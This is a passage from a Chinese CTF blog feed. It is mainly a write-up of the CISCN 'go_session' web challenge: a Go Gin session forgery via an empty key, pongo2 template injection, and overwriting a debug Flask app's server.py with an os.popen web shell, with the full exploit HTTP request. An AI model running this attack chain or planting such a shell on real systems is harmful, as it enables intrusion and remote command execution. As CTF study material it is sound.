title=&quot;122&quot;&gt;&lt;message&gt;&amp;foo;&lt;/message&gt;&lt;/post&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/24/bkAafJ4giBScw83.png" alt="32"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> XXE </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 国赛web题目复现</title>
      <link href="/2023/10/13/CISCN/"/>
      <url>/2023/10/13/CISCN/</url>
      
        <content type="html"><![CDATA[<h1>CISCN 国赛web题目复现</h1><h2 id="go-session">go_session</h2><h3 id="代码审计">代码审计</h3><p>来看看这道go的session伪造和pongo2模板注入</p><p>给了源码先来做代码审计</p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主函数主要引入route文件和golang的Gin框架，设置三个路由<code>/index</code>、<code>/admin</code>、<code>/flask</code>，并将项目运行在80端口上</p><p><strong>route.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// route.go</span></span><br><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个路由文件，设置了三个路由，应用了Gin框架和pongo2的模板引擎</p><p><code>var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;)))</code>这段代码读取环境变量中的SESSION_KEY用于生成session，但经过尝试发现没法获取到密钥，经过查询发现 <code>os.Getenv</code> 如果获取不存在的环境变量就会返回空值，可以大胆猜测密钥为空</p><p><strong>index</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Index函数用于处理根路径下的请求，它的参数是一个指向gin.Context的指针，而gin.Context是Gin框架中的一种上下文对象类型。它是一个包含了当前http请求和响应的信息、操作方法和属性的结构体，用于在处理http请求时传递和操作这些信息。同时gin.Context还提供了一系列的方法用于处理这些信息，这个将是我们后面利用的重点。</p><p>函数首先会获取名为 session-name 的cookie会话，然后判断会话中的name值是否为空，如果为空，就会将name的值设置为guest，然后将会话保存到请求中，最后使用String方法返回一个状态码和一个字符串。(注意无论伪造cookie是否成功，均回显hello，guest！)</p><p>当我们直接访问时回显hello，guest！</p><p><strong>admin</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Admin函数用于处理 /admin 下的请求，首先会获取会话，然后判断name字段的值是不是admin，如果不是就立即返回No，所以这里要进行session-name构造，使name字段的值为admin，然后进行下一步的操作，接着就是获取url请求中name字段的值，默认值是ssti，接着用EscapeString函数进行转义，防止XSS攻击，然后使用pongo2的模板引擎将字符串&quot;Hello&quot;和转义后的name字段值作为模板内容写入模板中，然后就是执行模板，将执行的结果存储在out中，最后返回out。（存在模板注入漏洞）</p><p>直接访问就会回显No</p><p><strong>Flask</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flask函数用于处理 /flask 函数下的请求，首先获取会话，然后判断name字段是否为空，如果不为空则获取url中name字段的值，并将其与本地地址拼接，发送一个GET请求。请求结束后关闭响应体，然后读取响应题的内容，将其转换为字符串返回。简单来说就是获取name参数访问内部5000端口的flask服务并回显页面。直接访问会爆404错误</p><p>我们尝试传入name参数<code>/flask?name=/</code>，引发报错拿到flask源码</p><p><img src="https://s2.loli.net/2023/10/13/OZRUk5qBKzW8Qev.png" alt="flak源码"></p><p><strong><a href="http://server.py">server.py</a></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>看这个源码，很显然在5000端口搭建的是一个flask的程序，而且更重要的是，这个程序设置了debug=True，说明程序开启了热加载功能，代码在更改后会自动重新加载程序，这意味着我们对代码进行更改后就会立即生效</p><blockquote><p>经验：flak框架开启debug的考点主要有两种，一是配合任何文件读取算pin码实现RCE，二是考察文件覆盖，也就是热加载</p></blockquote><p><strong>注意</strong>：<code>/flask</code>路由中的拼接逻辑，这个通过参数拼接访问本地5000端口上的flask程序，问题就出在拼接上，c.DefaultQuery()获取的是url请求中name参数的值直接拼接上去，如果我传入的name的值为空的话，c.DefaultQuery()就是空，那就相当于直接访问<code>http://127.0.0.1:5000/</code></p><h3 id="复现过程">复现过程</h3><p>我们一步一步来，想在<code>/admin</code>路由中利用SSTI覆写文件之前需要先伪造cookie绕过检测，根据前面的猜测我们只需要略微更改session的生成函数，若<code>if session.Values[&quot;name&quot;] != &quot;admin&quot; &#123;session.Values[&quot;name&quot;] = &quot;admin&quot;</code>,并拉取源代码在本地运行即可伪造出cookie，若伪造成功应回显<code>hello,admin</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">message := fmt.Sprintf(<span class="string">&quot;Hello, %s&quot;</span>, session.Values[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">c.String(<span class="number">200</span>, message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意在本地运行go代码时，除了下载SDK和相应库外，还可能报listen tcp :8080: bind: An attempt was made to access a socket in a way forbidden这类错误，原因是本地8080端口常有其他服务，导致端口占用。在main函数中该换其他端口号即可。</p></blockquote><p><img src="https://s2.loli.net/2023/10/14/yfbwG3Y9ZizodPJ.png" alt="swssion伪造"></p><p>这样就算成功了，复制session到靶场访问<code>/admin</code>回显hello，ssti开始下一步</p><p>这里我们用debug模式下的热加载替换flask源码实现RCE，要用到SaveUploadedFile方法实现任意文件写</p><p><code>&#123;&#123;c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")&#125;&#125;</code></p><blockquote><p>但这里要注意参数经过 html.EscapeString(name) 转义，会将双引号转义掉，所以要换一种方式，对于&quot;file&quot;，gin.Context还提供了另一种方法，HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin/route.Admin，然后可以用过滤器last获取最后一个字符串。对于 “/app/server.py”，可以在请求头中将Referer字段设置成 “/app/server.py”，然后用 Request.Referer()方法获取Referer的值。（还有其他方法，如Request.Host()、<a href="http://Request.UA">Request.UA</a>()等）</p></blockquote><p>还需要更改的点，因为要从Referer头中获取源码路径，故添加<code>Referer: /app/server.py</code>，且上传文件提交表单需要Content-Type 请求，同时需要边界字符串分割（可自定义），故添加<code>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND</code></p><p>上传源代码也很简单,接收一个名为 name 的参数，并使用 os.popen() 执行该参数作为命令，并返回执行结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>完整数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8b07fdbf-48c8-44c7-9482-7c2c5ac378d9.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>/app/server.py</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTY5NzIwNDMzMXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXwR0sKvw-X3wCZB3mczzdP14XPXLMSOjQd_CcqOagipbg==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>429</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;n&quot;; filename=&quot;1.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    file=os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> file</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;0.0.0.0&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/10/14/JLWpAzZREQU5SKe.png" alt="success"></p><p>接下来访问<code>/flask</code>路由传参查看环境变量即可<code>?name=?name=env</code></p><p><img src="https://s2.loli.net/2023/10/14/Evh39Jum5AqPwin.png" alt="env"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSTI </tag>
            
            <tag> session伪造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow题解-sql注入</title>
      <link href="/2023/09/22/CTFshow/CTFshow4/"/>
      <url>/2023/09/22/CTFshow/CTFshow4/</url>
      
